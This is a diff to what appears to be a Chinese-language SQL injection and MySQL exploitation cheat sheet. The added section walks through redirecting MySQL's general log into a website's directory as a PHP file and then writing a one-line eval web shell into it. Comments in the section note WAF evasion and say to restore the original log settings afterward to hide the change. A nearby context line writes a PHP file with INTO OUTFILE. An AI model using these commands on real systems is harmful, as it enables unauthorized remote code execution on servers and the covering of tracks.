@@ -346,6 +346,20 @@ select * from (select * from 表名 a join 表名 b using (已知的字段,已�
 
   - SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/1.php';
 
+### 利用日志读写文件
+
+```shell
+mysql> show variables like '%general%'#先看下当前mysql默认的日志位置在什么地方,'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log' 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来
+mysql> set global general_log = on#默认基本都是关闭的,不然这个增删改查的记录量可能会非常大
+mysql> set global general_log_file = 'C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs/abouts.php'#此时,再把原本的日志文件位置指向到目标网站的物理路径
+mysql> select '<?php eval($_POST[request]);?>'#开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell
+
+
+##写完之后记得恢复
+mysql> set global general_log_file = 'C:\phpStudy\MySQL\data\stu1.log';
+mysql> set global general_log = off;
+```
+
 
 
 
@@ -375,6 +389,10 @@ select 1,2;select 2,3
 ### 盲注
 
 #### bool 盲注
+
+
+
+
 
 #### 时间盲注
 
